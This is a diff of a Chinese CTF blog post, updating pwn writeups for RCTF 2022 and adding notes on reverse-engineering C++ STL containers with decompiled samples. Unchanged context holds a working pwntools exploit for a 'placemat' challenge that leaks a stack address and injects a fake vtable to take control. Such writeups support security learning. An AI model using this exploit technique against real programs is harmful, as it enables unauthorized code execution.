@@ -32,7 +32,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230101233406596.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20230102183226852.png">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2023-01-02T13:25:54.197Z">
+<meta property="article:modified_time" content="2023-01-04T15:54:57.022Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -219,7 +219,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      97k 字
+      102k 字
     </span>
   
 
@@ -228,7 +228,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1212 分钟
+      1276 分钟
     </span>
   
 
@@ -269,7 +269,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2023年1月2日 晚上
+                  不可视境界线最后变动于：2023年1月4日 晚上
                 
               </p>
             
@@ -1001,7 +1001,7 @@
 <li><em>primary base class</em>: For a dynamic class, the unique base class (if any) with which it shares the virtual pointer at offset 0.</li>
 <li><em>proper base class</em>: 继承树中一个类的所有父类</li>
 <li><em>secondary virtual table</em>: The instance of a virtual table for a base class that is <strong>embedded</strong> in the virtual table of a class derived from it.</li>
-<li><em>The primary virtual table</em> can be viewed as two virtual tables accessed from a shared virtual table pointer. </li>
+<li><em>The primary virtual table</em> can be viewed as two virtual tables accessed from <strong>a shared virtual table</strong> pointer. </li>
 <li><em>virtual table group</em>: The primary virtual table for a class along with all of the associated secondary virtual tables for its proper base classes.</li>
 </ul>
 </li>
@@ -1232,7 +1232,16 @@
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&#x27;./placemat&#x27;</span><br>p = process(<span class="hljs-string">&quot;./placemat&quot;</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;yog&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>ru(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>p2_name_addr = stack_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span><br><br>log.success(<span class="hljs-string">f&#x27;leak value: 0x<span class="hljs-subst">&#123;stack_addr:x&#125;</span>&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr+<span class="hljs-number">20</span>+<span class="hljs-number">48</span>+<span class="hljs-number">4</span>])<br><span class="hljs-comment"># 一串\x00就是为了跳过Game class的内存. </span><br>pl2 = flat([<span class="hljs-string">b&#x27;fake_bot&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">20</span>+<span class="hljs-number">48</span>-<span class="hljs-number">8</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF4E</span>, <span class="hljs-number">0x804AF4E</span>])<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(pl1)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#gdb.attach(p, &#x27;b *0x804AA96\nc&#x27;)</span><br><span class="hljs-comment">#input(&#x27;wait for gdb&#x27;)</span><br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(pl2)<br><br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure>
 
 <p>这个exp的问题是由于先手是随机的但是并未检测先手, 导致一半概率达不到想要的结果. 多试两次或者再写个大循环catch exception. </p>
-<h1 id="RCTF-2022"><a href="#RCTF-2022" class="headerlink" title="RCTF 2022"></a>RCTF 2022</h1><h2 id="MyCarShowSpeed"><a href="#MyCarShowSpeed" class="headerlink" title="MyCarShowSpeed"></a>MyCarShowSpeed</h2><ul>
+<h1 id="RCTF-2022"><a href="#RCTF-2022" class="headerlink" title="RCTF 2022"></a>RCTF 2022</h1><ul>
+<li>RCTF 2022 writeup by W&amp;M <a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/35/">https://blog.wm-team.cn/index.php/archives/35/</a> </li>
+<li>RCTF 2022 pwn bfc offical wp <a target="_blank" rel="noopener" href="https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc">https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc</a> </li>
+<li>RCTF 2022 bfc wp <a target="_blank" rel="noopener" href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc</a> </li>
+<li>RCTF2022 wp by b3f0re  <a target="_blank" rel="noopener" href="https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md">https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md</a> </li>
+<li>RCTF 2022 Official Writeup - Crypto Part <a target="_blank" rel="noopener" href="https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part">https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part</a> </li>
+<li>RCTF 2022 writeup by Nu1L [233](<a target="_blank" rel="noopener" href="https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF">https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF</a> WriteUp By Nu1L.pdf&amp;e=1670928565&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mB8kQYKlYDn-S3ySMDt9Dt9P1L8=) </li>
+<li>RCTF2022-MyCarsShowSpeed Writeup <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-275512.htm">https://bbs.pediy.com/thread-275512.htm</a></li>
+</ul>
+<h2 id="MyCarShowSpeed"><a href="#MyCarShowSpeed" class="headerlink" title="MyCarShowSpeed"></a>MyCarShowSpeed</h2><ul>
 <li><p>New a Game</p>
 <ul>
 <li>stability, performance. 真看不出来漏洞…..</li>
@@ -1286,15 +1295,14 @@
 <ol start="6">
 <li>Quit</li>
 </ol>
-<p>?????????????????????????????????????????鉴定为烂, 源码和源文件都和目标文件行为到处都不一样, 被整晕了, 不做了. 本质是tcache利用.</p>
+<p>?????????????????????????????????????????鉴定为烂, 根本不知道哪个文件是远程环境使用的, 被整晕了, 不做了. 本质是tcache利用.</p>
 <img src="../../image/recent_ctf/image-20230101233406596.png" srcset="/img/loading.gif" lazyload alt="image-20230101233406596" style="zoom:80%;" />
 
 <h2 id="Diary"><a href="#Diary" class="headerlink" title="Diary"></a>Diary</h2><blockquote>
 <p>C++逆向. 看到了std::string和std::map的逆向代码. 如果要看懂应该要找找stl的逆向教程.</p>
 </blockquote>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/using_declaration">using declaration</a> </li>
-<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270547.htm">浅谈STL容器识别</a> </li>
+<li><strong><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270547.htm">浅谈STL容器识别</a></strong> !!!!!!!</li>
 </ul>
 <p>开课了, C++基础班. 看了几个深蓝色的链接, 深感知识匮乏啊, 真不愧是C++.</p>
 <img src="../../image/recent_ctf/image-20230102183226852.png" srcset="/img/loading.gif" lazyload alt="image-20230102183226852" style="zoom:33%;" />
@@ -1303,7 +1311,7 @@
 <li><p><a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/using_declaration">using statement</a>. can be used to introduce a member of base class into derived class definition. </p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/keyword/typename">typename keyword</a> :  Inside a declaration or a definition of a template, typename can be used to declare that a <a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/dependent_name">dependent qualified name</a> is a type.</p>
-<p><strong>then, what is dependent qualified name??</strong>  </p>
+<p><strong>then, what is qualified name??</strong>  </p>
 <ul>
 <li>A qualified name may refer to a<ul>
 <li>class member (including static and non-static functions, types, templates, etc)</li>
@@ -1314,9 +1322,47 @@
 <li>For an <em>unqualified</em> name, that is a name that does not appear to the right of a scope resolution operator <strong><code>::</code></strong>, name lookup sequence depend on reference position(such as global, in namespace, Non-member function definition, etc.)</li>
 </ul>
 <p>**finally, what is the word <em>dependent</em> ? ** </p>
-<p>- </p>
+<ul>
+<li>not determined by template arguments. </li>
+</ul>
+</li>
+<li><p>所以, STL源码中class内部的<code>using _Nodeptr = typename _Val_types::_Nodeptr;</code>也就可以理解了</p>
+</li>
+<li><p>map和set:</p>
+<ul>
+<li>使用的红黑树: 在查询上最多比平衡二叉树多一次查找, 但是在插入和删除的时候更为高效, 因为其不追求完全的平衡, 减少了大量的平衡性计算.</li>
+</ul>
 </li>
 </ul>
+<p style="font-size:large;font-weight:bold"> 得出结论, MSVC会内联一些代码导致看起来分不清楚, 但是g++编译的话会出现默认allocator的定义后再构造string或者对应的容器, 已经相当简洁了不用在区分容器上过多分析</p>
+
+<p>但是在逆向文件时发现有不少奇怪函数, 并没有找到教程之类的东西, 有一本RE4B勉强看看吧, 就从这里入个门.</p>
+<p>STL源码也不一定要看, 主要是代码和反编译出来的东西的对应. 注意到上面链接中的是msvc版本的STL, 而GNU的STL在下面</p>
+<p>link: <a target="_blank" rel="noopener" href="https://leezw.net/assets/pdf/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.pdf">SGI-STL BOOK</a> | <a target="_blank" rel="noopener" href="https://github.com/steveLauwh/SGI-STL">SGI_STL Repo</a> | <a target="_blank" rel="noopener" href="https://github.com/arkingc/note/blob/master/C++/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.md">book note</a> | <a target="_blank" rel="noopener" href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/basic_string.h">GNU STL</a> | </p>
+<h3 id="STL-REVERSING"><a href="#STL-REVERSING" class="headerlink" title="STL REVERSING"></a>STL REVERSING</h3><blockquote>
+<p>吾爱找的IDA的DWARF解析出问题, 导致有符号版示例源码变量显示不全, IDA FREE没有这个问题. 明天重下个IDA看看. free版本的使用cloud decompiler实在有点慢, 不过倒也能接受. </p>
+</blockquote>
+<p>示例用源码:</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  map&lt;string, <span class="hljs-keyword">int</span>&gt; m;<br>  string fuckkey = <span class="hljs-string">&quot;fuck&quot;</span>;<br>  m[fuckkey] = <span class="hljs-number">1</span>;<br><br>  set&lt;<span class="hljs-keyword">int</span>&gt; s;<br>  s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">10</span>);<br><br>  vector&lt;string&gt; v;<br>  v.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;vector string&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>无符号和有符号:</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">59</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  <span class="hljs-keyword">char</span> v10[<span class="hljs-number">47</span>]; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  <span class="hljs-keyword">char</span> v11[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  <span class="hljs-built_in">sub_2648</span>(v7, a2, a3);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  <span class="hljs-built_in">sub_2834</span>(v6, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;v8);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v8);<br>  *(_DWORD *)<span class="hljs-built_in">sub_28D4</span>(v7, v6) = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">sub_26B8</span>(v5);<br>  v9 = <span class="hljs-number">10</span>;<br>  <span class="hljs-built_in">sub_2A5C</span>(v5, &amp;v9);<br>  <span class="hljs-built_in">sub_2728</span>(v4);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2834</span>(v10, <span class="hljs-string">&quot;vector string&quot;</span>, v11);<br>  <span class="hljs-built_in">sub_2B90</span>(v4, v10);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v11);<br>  <span class="hljs-built_in">sub_2B4C</span>(v4);<br>  <span class="hljs-built_in">sub_26D4</span>(v5);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(v6);<br>  <span class="hljs-built_in">sub_2664</span>(v7);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  std::vector&lt;..::basic_string&lt;... &gt;,std::allocator&lt;..::basic_string&lt;... &gt; &gt; &gt; v; <span class="hljs-comment">// [rsp+0h] [rbp-F0h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt; s; <span class="hljs-comment">// [rsp+20h] [rbp-D0h] BYREF</span><br>  std::string fuckkey; <span class="hljs-comment">// [rsp+50h] [rbp-A0h] BYREF</span><br>  std::map&lt;..::basic_string&lt;... &gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;... &gt; &gt;,allocator &gt; m; <span class="hljs-comment">// [rsp+70h] [rbp-80h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; __a; <span class="hljs-comment">// [rsp+ABh] [rbp-45h] BYREF</span><br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt; &gt;::value_type __x; <span class="hljs-comment">// [rsp+ACh] [rbp-44h] BYREF</span><br>  ..::basic_string&lt;... &gt; v10; <span class="hljs-comment">// [rsp+B0h] [rbp-40h] BYREF</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt; v11; <span class="hljs-comment">// [rsp+DFh] [rbp-11h] BYREF</span><br><br>  std::map&lt;..::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;...&gt;&gt;,allocator&gt;::<span class="hljs-built_in">map</span>(&amp;m);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;__a, argv);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;fuckkey, <span class="hljs-string">&quot;fuck&quot;</span>, &amp;__a);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;__a);<br>    <br>  *std::map&lt;..::basic_string&lt;&gt;::<span class="hljs-keyword">operator</span>[](<br>     &amp;m,<br>     &amp;fuckkey) = <span class="hljs-number">1</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">set</span>(&amp;s);<br>  __x = <span class="hljs-number">10</span>;<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">insert</span>(&amp;s, &amp;__x);<br>    <br>  std::vector&lt;..::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v11, &amp;__x);<br>  ..::basic_string&lt;...&gt;::basic_string&lt;std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(<br>    &amp;v10,<br>    <span class="hljs-string">&quot;vector string&quot;</span>,<br>    &amp;v11);<br>  std::vector&lt;..::basic_string&lt;...&gt;,allocator&gt;::<span class="hljs-built_in">push_back</span>(<br>    &amp;v,<br>    &amp;v10);<br>  <span class="hljs-comment">//Destructor</span><br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v10);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v11);<br>  std::vector&lt;..::basic_string&lt;...&gt;,allocator&gt;::~<span class="hljs-built_in">vector</span>(&amp;v);<br>  std::set&lt;<span class="hljs-keyword">int</span>,std::less&lt;<span class="hljs-keyword">int</span>&gt;,std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">set</span>(&amp;s);<br>  ..::basic_string&lt;...&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;fuckkey);<br>  std::map&lt;..::basic_string&lt;...&gt;,<span class="hljs-keyword">int</span>,std::less&lt;..::basic_string&lt;...&gt;&gt;,allocator&gt;::~<span class="hljs-built_in">map</span>(&amp;m);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><blockquote>
+<p><del>64位下占用32字节,</del> 感觉不是很固定啊, 还是得看具体的架构和系统. 就拿64位linux版gcc编译的吧. </p>
+</blockquote>
+<p>64位下占用32字节. 差点忘记class的实现是先在栈上分配空间然后构造时把this指针(指向栈上)放到构造函数的第一个位置, 找相应构造函数半天没看到原来是这样.  就是这个<code>basic_string( const CharT* s, const Allocator&amp; alloc = Allocator() );</code>, 可以查到各种std::string std::wstring等就是basic_string模板的实例化. </p>
+<blockquote>
+<p>这个所谓的allocator就占用一字节, 懒得探究这是什么了. </p>
+</blockquote>
+<p>搞不明白这32字节是什么东西, 暂时放弃. 反正string所有的构造函数都在basic_string里查找即可, 全局string和其他全局变量的构造函数一起被加入为构造函数指针数组, 在<code>_do_global_ctors</code>之类的函数里按顺序执行. main里面的string按照局部class变量分配和使用空间.</p>
+<h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p>也是32字节. </p>
+<h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>48字节. </p>
+<h4 id="map-1"><a href="#map-1" class="headerlink" title="map"></a>map</h4><p>59字节是个什么东西. </p>
 
             </div>
             <hr>
